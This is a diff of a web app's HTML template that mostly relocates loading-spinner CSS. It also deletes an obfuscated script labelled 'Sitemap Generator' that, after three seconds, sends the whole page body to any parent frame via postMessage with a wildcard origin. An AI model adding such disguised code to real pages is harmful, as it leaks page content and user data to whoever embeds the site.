@@ -28,93 +28,79 @@
     </noscript>
     <div id="root">
       <div class="lds-grid"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+      <style type="text/css">
+        .lds-grid {
+          width: 64px;
+          height: 64px;
+          margin: 0;
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          -ms-transform: translate(-50%, -50%);
+          transform: translate(-50%, -50%);
+        }
+        .lds-grid div {
+          position: absolute;
+          width: 10px;
+          height: 10px;
+          border-radius: 50%;
+          background: #159eee;
+          animation: lds-grid 1.2s linear infinite;
+        }
+        .lds-grid div:nth-child(1) {
+          top: 6px;
+          left: 6px;
+          animation-delay: 0s;
+        }
+        .lds-grid div:nth-child(2) {
+          top: 6px;
+          left: 26px;
+          animation-delay: -0.4s;
+        }
+        .lds-grid div:nth-child(3) {
+          top: 6px;
+          left: 45px;
+          animation-delay: -0.8s;
+        }
+        .lds-grid div:nth-child(4) {
+          top: 26px;
+          left: 6px;
+          animation-delay: -0.4s;
+        }
+        .lds-grid div:nth-child(5) {
+          top: 26px;
+          left: 26px;
+          animation-delay: -0.8s;
+        }
+        .lds-grid div:nth-child(6) {
+          top: 26px;
+          left: 45px;
+          animation-delay: -1.2s;
+        }
+        .lds-grid div:nth-child(7) {
+          top: 45px;
+          left: 6px;
+          animation-delay: -0.8s;
+        }
+        .lds-grid div:nth-child(8) {
+          top: 45px;
+          left: 26px;
+          animation-delay: -1.2s;
+        }
+        .lds-grid div:nth-child(9) {
+          top: 45px;
+          left: 45px;
+          animation-delay: -1.6s;
+        }
+        @keyframes lds-grid {
+          0%, 100% {
+            opacity: 1;
+          }
+          50% {
+            opacity: 0.5;
+          }
+        }
+      </style>
     </div>
-    <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
-
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
-
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
-    <style type="text/css">
-      .lds-grid {
-        width: 64px;
-        height: 64px;
-        margin: 0;
-        position: absolute;
-        top: 50%;
-        left: 50%;
-        -ms-transform: translate(-50%, -50%);
-        transform: translate(-50%, -50%);
-      }
-      .lds-grid div {
-        position: absolute;
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #159eee;
-        animation: lds-grid 1.2s linear infinite;
-      }
-      .lds-grid div:nth-child(1) {
-        top: 6px;
-        left: 6px;
-        animation-delay: 0s;
-      }
-      .lds-grid div:nth-child(2) {
-        top: 6px;
-        left: 26px;
-        animation-delay: -0.4s;
-      }
-      .lds-grid div:nth-child(3) {
-        top: 6px;
-        left: 45px;
-        animation-delay: -0.8s;
-      }
-      .lds-grid div:nth-child(4) {
-        top: 26px;
-        left: 6px;
-        animation-delay: -0.4s;
-      }
-      .lds-grid div:nth-child(5) {
-        top: 26px;
-        left: 26px;
-        animation-delay: -0.8s;
-      }
-      .lds-grid div:nth-child(6) {
-        top: 26px;
-        left: 45px;
-        animation-delay: -1.2s;
-      }
-      .lds-grid div:nth-child(7) {
-        top: 45px;
-        left: 6px;
-        animation-delay: -0.8s;
-      }
-      .lds-grid div:nth-child(8) {
-        top: 45px;
-        left: 26px;
-        animation-delay: -1.2s;
-      }
-      .lds-grid div:nth-child(9) {
-        top: 45px;
-        left: 45px;
-        animation-delay: -1.6s;
-      }
-      @keyframes lds-grid {
-        0%, 100% {
-          opacity: 1;
-        }
-        50% {
-          opacity: 0.5;
-        }
-      }
-    </style>
-    <!-- Sitemap Generator -->
-    <script type="text/javascript">
-      var _0xaea9 = ["sitemapgenerator:: ", "innerHTML", "body", "document", "stringify", "*", "postMessage", "setTimeout"]; window[_0xaea9[7]](function () { parent[_0xaea9[6]](_0xaea9[0] + JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]), _0xaea9[5]) }, 3000);
-    </script>
   </body>
 </html>
